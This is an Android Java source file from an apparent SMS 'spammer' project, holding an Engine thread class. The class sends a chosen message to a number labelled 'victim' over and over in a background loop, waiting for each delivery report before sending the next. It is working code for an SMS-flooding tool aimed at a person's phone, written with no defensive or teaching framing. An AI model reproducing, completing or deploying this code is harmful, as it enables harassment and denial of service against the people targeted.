
package the.spammer.project;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

class Engine extends Thread {

	private static final String LOG_TAG   = Engine.class.getName();
	
	private static final String DELIVERED = "delivered", SENT = "sent";
	
	private static final Engine INSTANCE  = new Engine();

	public static Engine getInstance() {

		return Engine.INSTANCE;
	}

	private volatile boolean running = true, spamming = false;

	private PendingIntent	 delivery, sent;
	
	private String		 victim, message;

	@Override
	public void run() {
		
		android.os.Process.setThreadPriority(android.os.Process.THREAD_PRIORITY_BACKGROUND);
		this.init();
		while (this.running) {
			synchronized (this) {
				while (this.spamming) {
					SmsManager.getDefault().sendTextMessage(this.victim, null, this.message, Engine.this.sent, Engine.this.delivery);
					try {
						this.wait();
					} catch (final InterruptedException e) {
						Log.e(Engine.LOG_TAG, "InterruptedException", e);
					}
				}
			}
			synchronized (this) {
				try {
					if (this.running) {
						this.wait();
					}
				} catch (final InterruptedException e) {
					Log.e(Engine.LOG_TAG, "InterruptedException", e);
				}
			}
		}
	}

	synchronized void pause() {
		
		this.spamming = false;
	}

	synchronized void rezume(final String victim, final String message) {
		
		this.victim = victim;
		this.message = message;
		//
		if (!this.isAlive()) {
			new Thread(new Runnable() {
				
				@Override
				public void run() {
					
					Engine.this.start();
				}
			}).start();
		}
		this.spamming = true;
		this.notify();
	}
	
	synchronized void shutdown() {
		
		this.pause();
		this.running = false;
		this.notify();
	}
	
	private void init() {
		
		try {
			//
			this.sent = PendingIntent.getBroadcast(Spammer.getAppContext(), 0, new Intent(Engine.SENT), PendingIntent.FLAG_UPDATE_CURRENT);
			this.delivery = PendingIntent.getBroadcast(Spammer.getAppContext(), 0, new Intent(Engine.DELIVERED), PendingIntent.FLAG_UPDATE_CURRENT);
			//
			Spammer.getAppContext().registerReceiver(new BroadcastReceiver() {

				@Override
				public void onReceive(final Context context, final Intent intent) {

					String result = new String();
					switch (this.getResultCode()) {
						case Activity.RESULT_OK:
							result = "Transmission successful";
							break;
						case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
						case SmsManager.RESULT_ERROR_RADIO_OFF:
						case SmsManager.RESULT_ERROR_NULL_PDU:
						case SmsManager.RESULT_ERROR_NO_SERVICE:
							result = "Transmission failed";
							break;
					}
					Toast.makeText(Spammer.getAppContext(), result, Toast.LENGTH_SHORT).show();
				}
			}, new IntentFilter(Engine.SENT));
			//
			Spammer.getAppContext().registerReceiver(new BroadcastReceiver() {

				@Override
				public void onReceive(final Context context, final Intent intent) {

					synchronized (Engine.this) {
						Engine.this.notify();
					}
					Toast.makeText(Spammer.getAppContext(), "Delivered", Toast.LENGTH_SHORT).show();
				}
			}, new IntentFilter(Engine.DELIVERED));
		} catch (final Exception e) {
			Log.e(Engine.LOG_TAG, "Failed to init SMS monitoring", e);
		}
	}
}